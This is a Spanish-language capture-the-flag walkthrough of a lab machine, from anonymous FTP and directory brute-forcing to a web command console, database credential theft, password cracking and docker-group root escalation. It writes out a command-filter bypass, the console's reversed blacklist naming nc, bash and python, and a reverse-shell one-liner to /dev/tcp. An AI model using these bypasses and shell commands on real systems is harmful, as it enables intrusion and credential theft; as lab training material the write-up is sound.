![Pasted image 20251208183641.png](images/Pasted%20image%2020251208183641.png)
Empezamos con la fase de reconocimiento

![Pasted image 20251208183641.png](images/Pasted%20image%2020251208183641.png)

Tenemos varios puertos abiertos 21,22,80 y lo primer que veo y se me hace interesante es que esta el usuario anonymous habilitado en el puerto 21

![Pasted image 20251208184036.png](images/Pasted%20image%2020251208184036.png)

entramos a ftp y vemos un archivo note.txt, me lo descargo y vamos a ver que tiene dentro

![Pasted image 20251208184132.png](images/Pasted%20image%2020251208184132.png)

Es una especie de mensaje

vamos a entrar a la pagina a ver que tiene

![Pasted image 20251208184256.png](images/Pasted%20image%2020251208184256.png)
parece una pagina web muy normal 

![Pasted image 20251208185052.png](images/Pasted%20image%2020251208185052.png)

con la herramienta gobuster hice fuerza bruta de los subdominios que hay en la pagina web y uno me llamo la atencion que es el "secret" veamos que tiene dentro


![Pasted image 20251208185137.png](images/Pasted%20image%2020251208185137.png)

hay una especie de consola interactiva que cuando hice whoami me tiro ese output

![Pasted image 20251208185225.png](images/Pasted%20image%2020251208185225.png)

pero con el comando ls me tiro esto, parece que no le gusta los comandos de hacker hahahahahah

podemos hacer uso de separadores para evitar esto y ver que contenido tiene la maquina como por ejemplo l\s para ls c\at para cat y asi

![Pasted image 20251208193525.png](images/Pasted%20image%2020251208193525.png)

con l\s vemos que tiene un archivo.php con rev lo podemos leer aunque esta al reves podemos utilizar una pagina para tener el texto claro y ahi podemos ver las palabras blacklisteadas 


>lmth< >ydob< >"TSOP"=dohtem mrof< >"dnammoC"=redlohecalp "dnammoc"=eman "txet"=epyt "mmoc"=di tupni< >nottub/nottub< >mrof/< php?< ))]'dnammoc'[TSOP_$(tessi(fi { ;]'dnammoc'[TSOP_$ = dmc$ ;)dmc$," "(edolpxe = erots$ ;)'sl','hs','ssel','erom','3nohtyp','liat','daeh','tac','mr','lrep','php','hsab' ,'nohtyp' ,'cn'(yarra = tsilkcalb$ )++i$ ;)erots$(tnuoc?{ >1h/";der:roloc"=elyts 1h< >elyts< ydob { ;)'fig.detcirtser_ezis-ewEelbaresiMgniliaF/segami'(lru :egami-dnuorgkcab ;retnec retnec :noitisop-dnuorgkcab ;taeper-on :taeper-dnuorgkcab ;dexif :tnemhcatta-dnuorgkcab ;revoc :ezis-dnuorgkcab } >elyts/< ;nruter php?< } } } >2h/<>?;)dmc$(cexe_llehs ohce php?<>";eulb:roloc"=elyts 2h<>? >elyts< ydob { ;)'fig.thguohton_gnipyt_yob_eulb/segami'(lru :egami-dnuorgkcab ;retnec retnec :noitisop-dnuorgkcab ;taeper-on :taeper-dnuorgkcab ;dexif :tnemhcatta-dnuorgkcab ;revoc :ezis-dnuorgkcab } >elyts/< } php?< >? >ydob/< >lmth/<


pasemos con el segundo paso que es tener una shell 

primero nos ponemos en escucha con nc en el puerto 443 que es un puerto comun en paginas web y asi nos quitamos el riesgo que un firewall nos detecte y luego ponemos este comando en el ejecutor de comandos  b'a'sh -c "b'a'sh -i >& /dev/tcp/TU_IP/443 0>&1" podemos burlar la blacklist porque b'a'sh no es lo mismo que bash

![Pasted image 20251208195417.png](images/Pasted%20image%2020251208195417.png)
![Pasted image 20251208201331.png](images/Pasted%20image%2020251208201331.png)
ya tenemos nuestra shell 

![Pasted image 20251208201331.png](images/Pasted%20image%2020251208201331.png)

en esta ruta encontre estos archivos ocultos que uno es .ssh 

![Pasted image 20251208201419.png](images/Pasted%20image%2020251208201419.png)

no pude hacer nada con eso, lo voy a ignorar

![Pasted image 20251208213138.png](images/Pasted%20image%2020251208213138.png)

en esta ruta encontre credenciales para la base de datos 

vamos a conectarnos a ella


![Pasted image 20251208214220.png](images/Pasted%20image%2020251208214220.png)

y aqui encontramos las credenciales de los usuarios pero las contrasenas estan en md5
asi que vamos a utilizar una herramienta digital para desencriptarlas

![Pasted image 20251208214309.png](images/Pasted%20image%2020251208214309.png)

aqui estan desencriptadas

![Pasted image 20251208215236.png](images/Pasted%20image%2020251208215236.png)
sigamos enumerando descargando las imagenes a ver si tienen datos

![Pasted image 20251208215737.png](images/Pasted%20image%2020251208215737.png)

con ninguna de las contrasenas que encontre funciona, voy a tener que hacer fuerza bruta del zip como ya he hecho anteriormente

![Pasted image 20251208220656.png](images/Pasted%20image%2020251208220656.png)

aqui tenemos la contrasena para el zip

Vamos a entrar a ver que contiene
![Pasted image 20251208220842.png](images/Pasted%20image%2020251208220842.png)

![Pasted image 20251208221001.png](images/Pasted%20image%2020251208221001.png)

esto es lo que contiene el archivo y vemos que tiene una contrasena en base64 y mas abajo dice Welcome anurodh asi que supongo que esa contrasena es para ese usuario

![Pasted image 20251208221102.png](images/Pasted%20image%2020251208221102.png)

aqui esta desencodeada la contrasena vamos a probarla

![Pasted image 20251208221416.png](images/Pasted%20image%2020251208221416.png)

y efectivamente, esa era la contrasena de ese usuario

![Pasted image 20251208221845.png](images/Pasted%20image%2020251208221845.png)

estamos en el grupo docker, eso es muy peligroso porque literalmente podemos ser root sin necesidad de contrasena, ahora vamos a ver como lo hacemos

![Pasted image 20251208222010.png](images/Pasted%20image%2020251208222010.png)

y listo con ese simple comando somos root, PWNED








